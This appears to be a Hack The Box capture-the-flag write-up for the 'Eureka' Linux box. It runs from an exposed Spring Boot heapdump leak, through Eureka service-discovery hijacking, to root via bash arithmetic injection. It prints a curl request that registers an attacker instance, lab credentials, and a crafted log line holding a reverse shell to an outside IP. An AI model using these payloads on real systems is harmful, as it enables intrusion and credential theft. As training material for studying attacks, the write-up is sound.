@@ -1,0 +1,110 @@
+Title: Eureka
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Eureka was a Linux box built around a `furni.htb` site backed by a Netflix Eureka service registry exposed on port 8761, with several Spring Boot microservices registered behind it. An unauthenticated Spring Boot actuator heapdump endpoint leaked plaintext credentials sitting in process memory, including both an application account and the Eureka registry's own basic-auth password. That access allowed abusing Eureka's instance registration API to hijack service discovery for an internal microservice, causing the gateway to proxy a live login request to an attacker-controlled listener and leak a second user's plaintext credentials in the process. SSH access followed for both recovered users. Local privilege escalation abused a root-owned log analysis script whose bash arithmetic comparison logic could be tricked into executing attacker-supplied shell commands, once a log file it processed was replaced with crafted content.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.66
+22/tcp   open  ssh
+80/tcp   open  http
+8761/tcp open  unknown
+
+> nmap -sC -sV -p22,80,8761 10.10.11.66
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+8761/tcp open  http    Apache Tomcat
+| http-auth:
+|_  Basic realm=Realm
+```
+
+Port 80 redirects to `furni.htb`, a furniture-company style site listing staff names and a contact address. Testing `/blog/1' OR 1=1'` returned a generic Spring Boot Whitelabel error page rather than useful SQL injection feedback. Port 8761 presented a basic-auth login page. Standard Kali wordlists missed the interesting content, but brute forcing directories against `furni.htb` with a larger community wordlist (OneListForAll) turned up `/register`, `/process_register`, and a full set of unauthenticated Spring Boot actuator endpoints under `/actuator`, including `/actuator/heapdump`.
+
+## Credential Leak via Exposed Actuator Heapdump
+
+The actuator's `/actuator/heapdump` endpoint dumps the JVM heap and was reachable without authentication, a known risk with exposed Spring Boot actuators. Downloading the heap dump and extracting printable strings, then scanning the output for credential-shaped patterns, surfaced plaintext application credentials as well as the basic-auth password protecting the Eureka dashboard itself:
+
+```
+oscar190:0sc@r190_S0l!dP@sswd
+EurekaSrvr:0scarPWDisTheB3st
+```
+
+## Foothold - SSH as oscar190
+
+```
+> ssh oscar190@10.10.11.66
+```
+
+The recovered application credentials worked directly over SSH, giving a shell as `oscar190`. No flag was present in this account's home directory, and enumeration turned up a second local user, `miranda-wise`, as the next target.
+
+## Eureka Service Registry Enumeration
+
+Logging into the Eureka dashboard on port 8761 with the recovered `EurekaSrvr` basic-auth credentials showed three registered applications on ports 8080 through 8082: `APP-GATEWAY`, `FURNI`, and `USER-MANAGEMENT-SERVICE`. From the `oscar190` shell, each service's local actuator endpoint was probed with curl; only `USER-MANAGEMENT-SERVICE` on port 8081 returned a distinct 404 response rather than a normal actuator response, and its name made it the most promising target for further attack. Research into known Eureka abuse techniques, including CVE-2021-39141 and public writeups on hijacking Eureka-based service discovery, pointed toward abusing the registry's instance registration API.
+
+## Service Discovery Hijack - Credential Interception
+
+Eureka allows any authenticated client to register a new "instance" for an existing application name, and other services in the mesh will then route requests for that application to whatever endpoint the new instance advertises. An authenticated POST to `/eureka/apps/USER-MANAGEMENT-SERVICE` was sent, registering an attacker-controlled IP and port as a new instance for that service:
+
+```
+curl -X POST "http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE" \
+  -H "Content-Type: application/json" \
+  -d '{ "instance": { "instanceId": "10.10.14.221:USER-MANAGEMENT-SERVICE:8081", ... "ipAddr": "10.10.14.221", "port": {"$": 8081, "@enabled": "true"} } }'
+```
+
+With a netcat listener running on the advertised port, the gateway soon proxied a live login request to it, capturing a URL-encoded POST body containing a second user's plaintext credentials:
+
+```
+username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve
+```
+
+Decoded, this gave:
+
+```
+miranda.wise:IL!veT0Be&BeT0L0ve
+```
+
+## Lateral Movement - SSH as miranda-wise
+
+```
+> ssh miranda-wise@10.10.11.66
+```
+
+These credentials worked over SSH, granting a shell as `miranda-wise` and access to the user flag.
+
+## Privilege Escalation - Bash Arithmetic Injection in log_analyse.sh
+
+Running linpeas flagged an unusual `/opt` directory containing a `heapdump` folder, a `scripts` directory, and a root-owned script, `log_analyse.sh`. Inside it, the function `analyze_http_statuses()` compared HTTP status codes pulled from a log file using bash's arithmetic test operator:
+
+```bash
+if [[ "$existing_code" -eq "$code" ]]; then
+```
+
+Bash arithmetic contexts evaluate their operands as arithmetic expressions and will perform command substitution on them, so a status "code" value that isn't a plain integer can be used to inject and execute shell commands, a class of bug documented by NCC Group's research on shell arithmetic expansion abuse.
+
+Two application log files under `/var/www/web/` were found to be writable by the current user's effective group:
+
+```
+/var/www/web/cloud-gateway/log/application.log
+/var/www/web/user-management-service/log/application.log
+```
+
+After confirming the script's expected log line format and status-field position, the `user-management-service` log was overwritten with a single crafted line whose "status" field contained a command substitution triggering a reverse shell:
+
+```
+> rm -rf /var/www/web/user-management-service/log/application.log
+> echo '2025-04-09T11:16:56.964Z  INFO 1234 --- [app-gateway] [main] com.netflix.discovery.DiscoveryClient    : HTTP Request: GET /api/resource Status: a[$(bash -i &>/dev/tcp/10.10.14.221/443 <&1)]' > /var/www/web/user-management-service/log/application.log
+```
+
+After waiting for the script to be triggered again (presumably by a scheduled root task), the payload fired and a root shell connected back.
+
+## Takeaways
+
+- Spring Boot actuator endpoints left exposed without authentication, especially `heapdump`, are a reliable source of leaked credentials and secrets sitting directly in raw process memory.
+- Netflix Eureka service registries that allow any authenticated client to register new instances for an existing application name let an attacker hijack service discovery and have other internal services proxy live traffic, including submitted credentials, to an attacker-controlled endpoint.
+- Basic-auth credentials protecting an internal admin panel are worth extracting from any leaked secrets dump, since they often double as the key needed to abuse that panel's own management API.
+- Log-processing scripts that feed attacker-influenced log fields into bash's arithmetic test operators (`-eq`, `-ne`, etc.) can be abused for command execution, since bash performs command substitution while evaluating arithmetic expressions.
+- Application log files that remain writable by a lower-privileged account are a direct vector for planting malicious content that a privileged, periodically-run script will later process and execute.
